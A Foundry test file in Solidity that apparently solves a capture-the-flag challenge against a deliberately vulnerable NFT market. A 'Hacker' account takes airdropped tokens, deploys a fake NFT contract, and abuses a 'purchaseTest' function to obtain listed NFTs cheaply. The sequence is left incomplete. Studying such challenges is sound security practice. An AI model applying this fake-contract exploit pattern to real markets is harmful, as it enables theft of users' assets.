// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/vulnerableMarket.sol";
import "../lib/forge-std/src/Test.sol";


contract vulnMarketTest is Test{
    address Hacker = address(6022023);
    VulnerableMarket market;
    ThreeSigmaToken tsToken;
    ThreeSigmaNFT tsNFT;

    function setUp() public {
        market = new VulnerableMarket();
        vm.deal(Hacker, 1 ether);
        tsNFT = ThreeSigmaNFT(market.tsNFT());
        tsToken = ThreeSigmaToken(market.tsToken());
    }

    function testNFT1() public{
        // Get order info to use for easier handling of the variables
        Order memory order0 = market.getOrder(0);
        Order memory order1 = market.getOrder(1);
        Order memory order2 = market.getOrder(2);

        //Get NFT 1
        vm.startPrank(Hacker);
        // normal calls should be prefered over low level calls due to reverts, etc.
        tsToken.airdrop();
        tsToken.approve(address(market),1);
        market.purchaseOrder(0);
        vm.stopPrank();



        // Get NFT2
        vm.startPrank(Hacker);
        ThreeSigmaNFT tsNFTnew = new ThreeSigmaNFT();
        tsNFTnew.mint(Hacker, 1);

        tsNFTnew.setApprovalForAll(address(market),true);
        
        market.purchaseTest(address(tsNFTnew), 1, 1337);
        tsToken.approve(address(market),1337);
        market.purchaseOrder(1);

        vm.stopPrank();


        tsNFT.ownerOf(order0.tokenId);
        tsNFT.ownerOf(order1.tokenId);
        tsNFT.ownerOf(order2.tokenId);

    }


}